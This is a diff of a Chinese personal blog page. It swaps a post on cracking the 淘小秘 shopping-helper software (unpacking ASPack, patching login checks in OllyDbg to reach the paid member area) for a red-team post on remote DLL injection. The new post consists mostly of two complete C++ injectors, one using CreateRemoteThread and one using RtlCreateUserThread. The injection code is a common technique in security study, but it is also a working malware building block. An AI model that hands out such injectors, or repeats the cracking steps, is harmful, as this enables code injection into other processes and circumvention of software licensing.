@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
-  <title>破解淘小秘【拼多多版】最新版 | 九世的博客</title>
-  <meta name="keywords" content=" Writing ">
-  <meta name="description" content="破解淘小秘【拼多多版】最新版 | 九世的博客">
+  <title>远程DLL注入研究 | 九世的博客</title>
+  <meta name="keywords" content=" 红队 ">
+  <meta name="description" content="远程DLL注入研究 | 九世的博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="Become a hacker">
 <meta property="og:type" content="website">
@@ -1461,9 +1461,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-破解淘小秘【拼多多版】最新版" class="article article-type-post" itemscope="" itemprop="blogPost">
+        <article id="post-远程DLL注入研究" class="article article-type-post" itemscope="" itemprop="blogPost">
     
-        <h1 class="article-title">破解淘小秘【拼多多版】最新版</h1>
+        <h1 class="article-title">远程DLL注入研究</h1>
     
     <div class="article-meta">
         
@@ -1472,14 +1472,14 @@
         
         <span class="tag">
             
-            <a href="javascript:" class="color3">Writing</a>
+            <a href="javascript:" class="color3">红队</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title="更新时间: 2019-04-19 20:36:16">2018-12-02 11:36</time>
+        创建时间:<time class="date" title="更新时间: 2020-09-14 01:28:48">2020-09-14 01:22</time>
         
     </div>
     <div class="article-meta">
@@ -1501,7 +1501,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#正文"><span class="toc-text">正文</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#CreateRemoteThread远程线程调用"><span class="toc-text">CreateRemoteThread远程线程调用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RtlCreateUserThread-DLL远程注入"><span class="toc-text">RtlCreateUserThread DLL远程注入</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1516,16 +1516,189 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>正常双修的星期天，下午准备上学。早上顺便学一下破解，看到shark恒第19课，破解网络认证<br>然后看到破解的是淘小秘的，上网下了个新的。折腾了一会，成功了= =<br><img src="http://pic.netbian.com/uploads/allimg/170819/195530-1503143730e279.jpg" alt="195530-1503143730e279.jpg"></p>
-<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>新版淘小秘下载：<a href="http://www.taoxiaomi.cn/download/" target="_blank" rel="noopener">http://www.taoxiaomi.cn/download/</a><br>下载之后顺便安装一个（我安的是拼多多的）<br><img src="https://s1.ax1x.com/2018/12/02/FuQCJf.png" alt="FuQCJf.png"><br>常规操作：查壳，查语言，入OD<br>1.PEID查壳，发现是ASP加密的壳<br>..<img src="https://s1.ax1x.com/2018/12/02/FuQFSS.png" alt="FuQFSS.png"><br>2.查一下什么语言写的，VC6写的<br><img src="https://s1.ax1x.com/2018/12/02/FuQewn.png" alt="FuQewn.png"><br>3.载入OD发现可以ESP定律脱壳，然后发现脱了之后有毛病，使用Aspack Stripper脱壳<br><img src="https://s1.ax1x.com/2018/12/02/FuQ8OJ.png" alt="FuQ8OJ.png"><br>脱壳之后在查，ok，脱掉<br><img src="https://s1.ax1x.com/2018/12/02/FuQJm9.png" alt="FuQJm9.png"><br>载入OD，成功看到VC6的OEP<br><img src="https://s1.ax1x.com/2018/12/02/FuQYwR.png" alt="FuQYwR.png"><br>输入万能断点，401000<br><img src="https://s1.ax1x.com/2018/12/02/FuQaY6.png" alt="FuQaY6.png"><br>然后右键点击查找（二进制字符串）输入：FF 25,定位窗体<br><img src="https://s1.ax1x.com/2018/12/02/FuQrOH.md.png" alt="FuQrOH.md.png"></p>
-<p><img src="https://s1.ax1x.com/2018/12/02/FuQcTI.png" alt="FuQcTI.png"><br>Ctrl+F搜索push 10001,寻找各种窗体，然后对刚刚那个进行替换，ok，完事<br><img src="https://s1.ax1x.com/2018/12/02/FuQWff.png" alt="FuQWff.png"><br>返回原来的进行替换<br><img src="https://s1.ax1x.com/2018/12/02/FuQ41S.md.png" alt="FuQ41S.md.png"><br>进行保存，打开一看进了会员中心<br><img src="https://s1.ax1x.com/2018/12/02/FuQ56g.md.png" alt="FuQ56g.md.png"><br>其实还能替换其他的窗体位置进入其他的地方</p>
-<p>总结：</p>
-<pre><code>破解联网认证的基本方法是跳过登陆的框框，有壳脱壳或者打补丁
-然后载入OD
-1.用万能断点401000，然后搜索二进制字符串FF 25
-2.搜索push 10001
-3.看见其他的窗体对原来的进行替换，保存文件
-</code></pre><p>转载请声明：转自422926799.github.io</p>
+        <p>太久没更新，都忘了写了。最近研究了一下远程DLL注入<br>做个笔记</p>
+<h2 id="CreateRemoteThread远程线程调用"><a href="#CreateRemoteThread远程线程调用" class="headerlink" title="CreateRemoteThread远程线程调用"></a>CreateRemoteThread远程线程调用</h2><p>原理:</p>
+<pre><code>* 读取目标要注入dll的进程句柄
+* 计算存储DLL路径所需要的字节数
+* 为远程进程分配一个内存以存储DLL路径名称
+* 复制DLL路径到远程进程
+* 获取LoadLibraryW在Kernel32.dll中的地址
+* 创建远程调用LoadLibraryW(在远程地址空间中)加载DLL
+* 等待远程线程结束(卸载DLL)
+</code></pre><pre><code class="cpp">#include &quot;stdafx.h&quot;
+#include &lt;Windows.h&gt;
+int main(int argc,char *argv[])
+{
+        DWORD dwDesiredAccess= PROCESS_QUERY_INFORMATION | PROCESS_CREATE_THREAD |  PROCESS_VM_OPERATION | PROCESS_VM_WRITE;
+        BOOL bInheritHandle=0;
+        DWORD dwProcessId;
+        PCWSTR dllPath = TEXT(&quot;C:\\testdll.dll&quot;); //设置DLLL路径
+        int dlllen = lstrlen(dllPath);
+        int dllbytes = dlllen * 2; //计算dll路径长度
+        if (argc == 2) {
+               dwProcessId = atoi(argv[1]);
+        }
+        else {
+               printf(&quot;Example:test.exe &lt;process_id&gt;\n&quot;);
+               exit(1);
+        }
+        HANDLE process=OpenProcess(dwDesiredAccess,bInheritHandle,dwProcessId); //读取进程获取句柄
+        if (process==0){
+               printf(&quot;[-] OpenProcess failure,Error code:%d\n&quot;,GetLastError());
+               exit(1);
+        }
+        else {
+               printf(&quot;[*] OpenProcess Sucess\n&quot;);
+        }
+        LPVOID vallex = VirtualAllocEx(process, 0, dllbytes, MEM_COMMIT, PAGE_READWRITE); //给远程地址分配一个可以放下dll路径的内存空间
+        if (vallex == 0) {
+               printf(&quot;[-] VirtualAllocEx failure,Error Code:%d\n&quot;,GetLastError());
+               exit(1);
+        }
+        else {
+               printf(&quot;[*] VirtualAllocEx Sucess\n&quot;);
+        }
+        if (!WriteProcessMemory(process, vallex, dllPath, dllbytes, 0)) { //远程内存写入
+               printf(&quot;[-] WriteProcessMemory failure,Error Code:%d\n&quot;, GetLastError());
+               exit(1);
+        }
+        else {
+               printf(&quot;[*] WriteProcessMemory Sucess\n&quot;);
+        }
+        FARPROC moduleaddress = GetProcAddress(GetModuleHandle(TEXT(&quot;Kernel32&quot;)),  &quot;LoadLibraryW&quot;); //获取Kernel32.dll里面LoadLibraryW函数地址
+        if (moduleaddress == 0) {
+               printf(&quot;[-] GetProcAddress failure,Error Code:%d\n&quot;, GetLastError());
+               exit(1);
+        }
+        else {
+               printf(&quot;[*] GetProcAddress Sucess\n&quot;);
+        }
+        HANDLE createthread_ = CreateRemoteThread(process, 0, 0,  LPTHREAD_START_ROUTINE(moduleaddress), vallex, 0, 0); //在远程进程调用dll
+        if (createthread_ == 0) {
+               printf(&quot;[-] createthread failure,Error Code:%d\n&quot;, GetLastError());
+               exit(1);
+        }
+        else {
+               printf(&quot;[*] CreateRemoteThread Sucess\n&quot;);
+               WaitForSingleObject(createthread_, INFINITE); //等待线程创建结束（卸载DLL）
+        }
+        return 0;
+}
+</code></pre>
+<p><img src="https://s1.ax1x.com/2020/09/14/wBJ526.png" alt=""></p>
+<p>注入测试<br><img src="https://s1.ax1x.com/2020/09/14/wBJ7rD.png" alt=""></p>
+<h2 id="RtlCreateUserThread-DLL远程注入"><a href="#RtlCreateUserThread-DLL远程注入" class="headerlink" title="RtlCreateUserThread DLL远程注入"></a>RtlCreateUserThread DLL远程注入</h2><blockquote>
+<p> RtlCreateUserThread是CreateRemoteThread的底层实现，所以使用RtlCreateUserThread的原理是和使用CreateRemoteThread的原理是一样的，这个函数可以实现跨会话创建线程。唯一的问题就是：当我们在Vista 之前的操作系统调用此函数所创建的线程并没有通知给csrss 进程，它没有完整的初始化，在调用一些网络或者其它的系统函数的时候他可能返回失败，而通过CreateRemoteThread 创建的线程没有任何问题，在Vista+的操作系统上调用此函数也没有问题。因此我们需要判断系统版本，当目标系统为Vista-的时候，我们应该通过RtlCreateUserThread创建一个挂起的线程，然后调用CsrClientCallServer通知csrss 这个线程的创建，然后csrss 做相应的记录及初始化工作之后，我们再恢复线程的执行。最后，我们新创建的线程必须自己调用ExitThread退出，否则也会产生崩溃的情况。</p>
+</blockquote>
+<p>原理:</p>
+<pre><code>* 读取目标要注入dll的进程句柄
+* 计算存储DLL路径所需要的字节数
+* 为远程进程分配一个内存以存储DLL路径名称
+* 复制DLL路径到远程进程
+* 获取LoadLibraryW在Kernel32.dll中的地址
+* 创建远程调用LoadLibraryW(在远程地址空间中)加载DLL
+* 在卸载的时候会此DLL
+</code></pre><pre><code class="cpp">#include &quot;stdafx.h&quot;
+#include &lt;Windows.h&gt;
+#include &lt;tlhelp32.h&gt;
+typedef DWORD(WINAPI * pRtlCreateUserThread)(
+        HANDLE      ProcessHandle,
+        PSECURITY_DESCRIPTOR  SecurityDescriptor,
+        BOOL      CreateSuspended,
+        ULONG     StackZeroBits,
+        PULONG     StackReserved,
+        PULONG     StackCommit,
+        LPVOID     StartAddress,
+        LPVOID     StartParameter,
+        HANDLE      ThreadHandle,
+        LPVOID     ClientID
+        );
+DWORD findbyname(WCHAR *name) {
+        HANDLE p;
+        PROCESSENTRY32W p2;
+        p = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+        p2.dwSize = sizeof(PROCESSENTRY32);
+        printf(&quot;Proces Listlen:%d\n&quot;, p2.dwSize);
+        BOOL besult = Process32FirstW(p, &amp;p2);
+        int calc = 0;
+        while (besult!=FALSE) {
+               int pid = p2.th32ProcessID;
+               WCHAR *processname = p2.szExeFile;
+               if (wcscmp(processname, name) == 0) {
+                       printf(&quot;%d &quot;, pid);
+                       wprintf(processname);
+                       printf(&quot;\n&quot;);
+                       return pid;
+               }
+               besult=Process32NextW(p,&amp;p2);
+               calc++;
+        }
+        return 0;
+}
+void Errorcode() {
+        printf(&quot;,Error Code:%d\n&quot;, GetLastError());
+        exit(1);
+}
+DWORD dllinject(LPCSTR dll,int pid) {
+        HANDLE h;
+        h = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
+        if (h == 0) {
+               printf(&quot;[-] OpenProcess failure&quot;);
+               Errorcode();
+        }
+        printf(&quot;[*] OpenProcess Sucess\n&quot;);
+        LPVOID moduleaddress =  (LPVOID)GetProcAddress(GetModuleHandle(TEXT(&quot;kernel32.dll&quot;)),&quot;LoadLibraryA&quot;);
+        if (moduleaddress == 0) {
+               printf(&quot;[-] GetProcAddress LoadLibraryW failure&quot;);
+               Errorcode();
+        }
+        printf(&quot;[*] GetProcAddress LoadLibraryW Address Sucess,Address=0x%x\n&quot;,  moduleaddress);
+        pRtlCreateUserThread RtlCreateUserThread = NULL;
+        RtlCreateUserThread =  (pRtlCreateUserThread)GetProcAddress(GetModuleHandle(TEXT(&quot;ntdll.dll&quot;)),  &quot;RtlCreateUserThread&quot;);
+        if (RtlCreateUserThread == 0) {
+               printf(&quot;[-] GetProcAddress RtlCreateUserThread failure&quot;);
+               Errorcode();
+        }
+        printf(&quot;[*] GetProcAddress RtlCreateUserThread Address Sucess,Address=0x%x\n&quot;,  RtlCreateUserThread);
+        //DWORD dwSize = (strlen(dll) + 1) * sizeof(char);
+        SIZE_T dwSize = strlen(dll);
+        LPVOID vt = VirtualAllocEx(h,0, dwSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+        if (vt == 0) {
+               printf(&quot;[-] VirtualAllocEx failure&quot;);
+               Errorcode();
+        }
+        printf(&quot;[*] VirtualAllocEx Sucess,Address=0x%x\n&quot;, vt);
+        BOOL dlladdress = WriteProcessMemory(h, vt, dll, dwSize, 0);
+        if (dlladdress == 0) {
+               printf(&quot;[-] WriteProcessMemory failure&quot;);
+               Errorcode();
+        }
+        printf(&quot;[*] WriteProcessMemory Sucess\n&quot;);
+        HANDLE hRemoteThread = NULL;
+         RtlCreateUserThread(h, NULL, 0, 0, 0, 0, moduleaddress, vt,&amp;hRemoteThread, NULL);
+        printf(&quot;%d\n&quot;, GetLastError());
+        if (hRemoteThread ==0) {
+               printf(&quot;[-] RtlCreateUserThread failure&quot;);
+               Errorcode();
+               return 1;
+        }
+        printf(&quot;[*] RtlCreateUserThread Sucess\n&quot;);
+        printf(&quot;[+] Dll Inject Sucess\n&quot;);
+        return 0;
+}
+int main()
+{
+        WCHAR *processname = TEXT(&quot;notepad.exe&quot;);
+        LPCSTR dllpath = &quot;C:\\Users\\JiuShi\\Desktop\\ABC.dll&quot;;
+        printf(&quot;DLL PATH:&quot;);
+        printf(&quot;\n&quot;);
+        int pid=findbyname(processname);
+        dllinject(dllpath, pid);
+        system(&quot;pause&quot;);
+    return 0;
+}
+</code></pre>
+<p><img src="https://s1.ax1x.com/2020/09/14/wBYpM8.png" alt=""></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
@@ -1535,12 +1708,12 @@
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>破解淘小秘【拼多多版】最新版</p>
+    <p><span class="copy-title">文章标题:</span>远程DLL注入研究</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="九世">九世</a></p>
-    <p><span class="copy-title">发布时间:</span>2018-12-02, 11:36:47</p>
-    <p><span class="copy-title">最后更新:</span>2019-04-19, 20:36:16</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/8d06f8ce.html" title="破解淘小秘【拼多多版】最新版">http://422926799.github.io/posts/8d06f8ce.html</a>
+    <p><span class="copy-title">发布时间:</span>2020-09-14, 01:22:11</p>
+    <p><span class="copy-title">最后更新:</span>2020-09-14, 01:28:48</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/7c405794.html" title="远程DLL注入研究">http://422926799.github.io/posts/7c405794.html</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
